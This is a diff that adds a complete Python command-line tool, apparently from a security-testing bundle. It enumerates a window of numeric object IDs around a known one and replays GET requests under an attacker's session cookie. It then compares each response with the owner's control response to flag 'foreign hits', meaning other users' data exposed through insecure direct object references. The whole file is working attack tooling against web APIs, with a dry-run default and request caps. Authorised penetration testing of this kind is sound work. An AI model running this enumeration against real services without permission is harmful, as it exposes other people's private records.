@@ -1,0 +1,187 @@
+#!/usr/bin/env python3
+"""Probe a window of candidate identifiers around a known one and triage the answers.
+
+The helper builds the candidate window locally, then replays one parameterised
+request per candidate under the attacker's session beside the owner's control
+response. It is the corpus-seeding step of the `idor` class in executable form:
+the swap procedure and the reference-form table stay in the bundle's matrix
+reference, and the principal handling stays owned by `two-principal-authz`.
+
+Usage:
+  idor-id-enumeration --base https://target.test --path '/api/orders/{id}' \\
+      --known 48291 --window 200
+  idor-id-enumeration --base https://target.test --path '/api/orders/{id}' \\
+      --known 48291 --window 200 --execute --session 'Cookie: session=<attacker>'
+  idor-id-enumeration --base https://target.test --path '/api/orders/{id}' \\
+      --known 48291 --window 50 --mode padded --execute --json-out hits.json
+
+Discipline:
+  - Dry run by default: the window size, the mode, and a sample of the
+    candidates print, and nothing is sent until `--execute` is given.
+  - Read-only: only GET is ever sent, and only to the `--path` template.
+  - Bounded: `--max-requests` caps the window, `--delay` paces it, and the
+    control request is sent first so every verdict has a baseline.
+  - The verdict vocabulary matches the class: `foreign-hit` is a success whose
+    body differs from the control, `own-object` is a success matching the
+    control digest, `success-uncontrolled` is a success the control could not
+    be compared against, `denied` and `not-found` are refusals, and `unknown` is
+    everything else and is never promoted to a finding.
+"""
+
+from __future__ import annotations
+
+import argparse
+import hashlib
+import json
+import ssl
+import sys
+import time
+import urllib.error
+import urllib.request
+
+SUCCESS = range(200, 300)
+
+
+def candidates(known: str, window: int, mode: str, direction: str) -> list[str]:
+    """Build the candidate window from the known identifier, or fall back to a
+    digit-suffix walk when the known value is not numeric."""
+    if not known.isdigit():
+        return []
+    base = int(known)
+    width = len(known)
+    span = range(-window, window + 1)
+    if direction == "up":
+        span = range(1, window + 1)
+    elif direction == "down":
+        span = range(-window, 0)
+    out: list[str] = []
+    for delta in span:
+        value = base + delta
+        if value < 0:
+            continue
+        out.append(str(value).zfill(width) if mode == "padded" else str(value))
+    return out
+
+
+def digest(payload: bytes) -> str:
+    return hashlib.sha256(payload).hexdigest()[:12]
+
+
+def fetch(url: str, headers: dict[str, str], timeout: float, context: ssl.SSLContext | None) -> dict[str, object]:
+    req = urllib.request.Request(url, method="GET")
+    for key, value in headers.items():
+        req.add_header(key, value)
+    try:
+        with urllib.request.urlopen(req, timeout=timeout, context=context) as response:
+            payload = response.read()
+            return {
+                "status": response.status,
+                "size": len(payload),
+                "content_type": response.headers.get("Content-Type", ""),
+                "digest": digest(payload),
+                "error": "",
+            }
+    except urllib.error.HTTPError as error:
+        payload = error.read()
+        return {
+            "status": error.code,
+            "size": len(payload),
+            "content_type": error.headers.get("Content-Type", "") if error.headers else "",
+            "digest": digest(payload),
+            "error": "",
+        }
+    except (urllib.error.URLError, TimeoutError, OSError) as error:
+        return {"status": 0, "size": 0, "content_type": "", "digest": "", "error": str(error)}
+
+
+def verdict(cell: dict[str, object], control: dict[str, object] | None) -> str:
+    status = int(cell["status"])
+    if status == 0:
+        return "unreachable"
+    if status == 404 or status == 410:
+        return "not-found"
+    if status in (401, 403):
+        return "denied"
+    if status in SUCCESS:
+        if control is None or int(control["status"]) not in SUCCESS:
+            return "success-uncontrolled"
+        return "own-object" if cell["digest"] == control["digest"] else "foreign-hit"
+    return "unknown"
+
+
+def parse_header(raw: str) -> tuple[str, str]:
+    name, _, value = raw.partition(":")
+    return name.strip(), value.strip()
+
+
+def main(argv: list[str] | None = None) -> int:
+    parser = argparse.ArgumentParser(description=__doc__.splitlines()[0])
+    parser.add_argument("--base", required=True, help="target base URL")
+    parser.add_argument("--path", required=True, help="request path template carrying {id}")
+    parser.add_argument("--known", required=True, help="one identifier the attacker is entitled to name")
+    parser.add_argument("--window", type=int, default=100, help="candidates either side of the known value")
+    parser.add_argument("--mode", choices=("sequential", "padded"), default="sequential", help="candidate spelling")
+    parser.add_argument("--direction", choices=("both", "up", "down"), default="both")
+    parser.add_argument("--session", action="append", default=[], help="header for the attacker session, name: value")
+    parser.add_argument("--control", action="append", default=[], help="header for the owner control, name: value")
+    parser.add_argument("--execute", action="store_true", help="send the probes; the default is a dry run")
+    parser.add_argument("--max-requests", type=int, default=400, help="hard cap on requests sent")
+    parser.add_argument("--timeout", type=float, default=10.0, help="per-request timeout in seconds")
+    parser.add_argument("--delay", type=float, default=0.0, help="pause between requests in seconds")
+    parser.add_argument("--insecure", action="store_true", help="skip TLS verification")
+    parser.add_argument("--verbose", action="store_true", help="print refusals as well as successes")
+    parser.add_argument("--json-out", help="write the per-candidate records to this path")
+    args = parser.parse_args(argv)
+
+    values = candidates(args.known, args.window, args.mode, args.direction)
+    if not values:
+        print("the known identifier must be numeric for a window to be built", file=sys.stderr)
+        return 2
+    if "{id}" not in args.path:
+        print("--path must carry the {id} placeholder", file=sys.stderr)
+        return 2
+    print(f"window: {len(values)} candidates around {args.known} in {args.mode} mode")
+    print(f"sample: {', '.join(values[:3])} ... {', '.join(values[-3:])}")
+    if not args.execute:
+        print("dry run: pass --execute to send")
+        return 0
+
+    session = dict(parse_header(raw) for raw in args.session)
+    control_headers = dict(parse_header(raw) for raw in args.control) or session
+    context = ssl._create_unverified_context() if args.insecure else None
+
+    control = fetch(
+        args.base.rstrip("/") + args.path.replace("{id}", args.known),
+        control_headers,
+        args.timeout,
+        context,
+    )
+    print(f"control: status={control['status']} size={control['size']} digest={control['digest']}")
+
+    records: list[dict[str, object]] = []
+    for value in values[: args.max_requests]:
+        cell = fetch(args.base.rstrip("/") + args.path.replace("{id}", value), session, args.timeout, context)
+        cell["id"] = value
+        cell["verdict"] = verdict(cell, control)
+        records.append(cell)
+        if args.delay:
+            time.sleep(args.delay)
+
+    print(f"\n{'id':16} {'status':6} {'size':8} {'digest':14} verdict")
+    for row in records:
+        if row["verdict"] in ("not-found", "unreachable") and not args.verbose:
+            continue
+        print(f"{row['id']:16} {row['status']:6} {row['size']:8} {row['digest']:14} {row['verdict']}")
+    hits = [row for row in records if row["verdict"] == "foreign-hit"]
+    print(f"\nforeign hits: {len(hits)} of {len(records)} candidates")
+    if hits:
+        print("confirm each hit against the owner control and the class's matrix before filing")
+    if args.json_out:
+        with open(args.json_out, "w", encoding="utf-8") as handle:
+            json.dump({"base": args.base, "known": args.known, "control": control, "candidates": records}, handle, indent=2)
+        print(f"wrote {args.json_out}")
+    return 0
+
+
+if __name__ == "__main__":
+    raise SystemExit(main())
